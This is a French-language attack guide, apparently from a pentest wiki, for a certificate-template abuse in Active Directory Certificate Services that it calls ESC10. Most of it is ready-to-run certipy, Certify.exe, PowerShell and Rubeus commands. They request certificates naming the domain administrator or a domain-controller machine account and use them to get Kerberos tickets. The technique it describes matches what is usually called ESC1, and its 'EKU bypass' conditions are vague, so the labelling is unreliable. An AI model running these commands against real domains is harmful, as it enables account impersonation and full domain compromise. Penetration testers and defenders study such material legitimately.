### Description

ESC10 exploite des modèles de certificats qui possèdent le flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME` activé mais qui sont configurés avec des EKU limitant leur usage apparent (comme "Any Purpose" restreint), permettant à un attaquant de spécifier un SAN arbitraire et d'utiliser le certificat pour l'authentification malgré les restrictions EKU apparentes.

### Conditions vulnérables

Un modèle de certificat est vulnérable à ESC10 si :

1. **Flag ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME activé** - Le modèle a `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME` (0x20000) dans `msPKI-Certificate-Name-Flag`
2. **EKU apparemment restrictif** - Le modèle semble avoir des EKU limitants mais exploitables
3. **Enrollment autorisé** - L'utilisateur a les droits `Enroll` ou `AutoEnroll`
4. **Contournement possible des vérifications EKU** - Les vérifications d'usage peuvent être contournées

---

### Exploitation depuis linux (certipy)

Enumération des templates vulnérables :

```bash
certipy find -u user@domain.local -p password -target dc01.domain.local

# Énumération avec sortie JSON pour analyse des flags et EKUs
certipy find -u user@domain.local -p password -target dc01.domain.local -json -output vulnerabilities.json 

# Recherche spécifique du flag ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME
certipy find -u user@domain.local -p password -target dc01.domain.local -vulnerable | grep -A5 -B5 "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME\|0x20000"
```

Exploitation avec SAN arbitraire :

```bash
# Demande d'un certificat avec SAN administrateur
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'RestrictedButVulnTemplate' -upn administrator@domain.local

# Avec DNS SAN pour comptes machine
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'RestrictedButVulnTemplate' -dns dc01.domain.local -upn 'DC01$@domain.local'
```

Authentification avec le certificat obtenu :

```bash
# Authentification en tant qu'administrateur
certipy auth -pfx administrator.pfx -username administrator -domain domain.local -dc-ip 192.168.1.10

# Authentification en tant que compte machine
certipy auth -pfx 'dc01$.pfx' -username 'DC01$' -domain domain.local -dc-ip 192.168.1.10
```

---

### Exploitation depuis windows (certify.exe)

Enumération des templates vulnérables :

```powershell
# Énumération des modèles vulnérables 
Certify.exe find /vulnerable 

# Filtrage spécifique ESC10
Certify.exe find /vulnerable | findstr "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME\|0x20000"

# Vérification manuelle des flags avec EKU analysis
Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"} -Properties * | Where-Object {
    $_.'msPKI-Certificate-Name-Flag' -band 0x20000
} | Select-Object Name, 'msPKI-Certificate-Name-Flag', pKIExtendedKeyUsage
```

Exploitation du template vulnérable :

```powershell
# Demande d'un certificat avec SAN administrateur
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:RestrictedButVulnTemplate /altname:administrator@domain.local

# Avec SAN pour compte machine
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:RestrictedButVulnTemplate /altname:DC01$@domain.local
```

Authentification avec le certificat obtenu :

```powershell
# Conversion du certificat si nécessaire
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx 

# Authentification avec le certificat 
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:password123 /ptt

# Pour un compte machine
Rubeus.exe asktgt /user:DC01$ /certificate:cert.pfx /password:password123 /ptt
```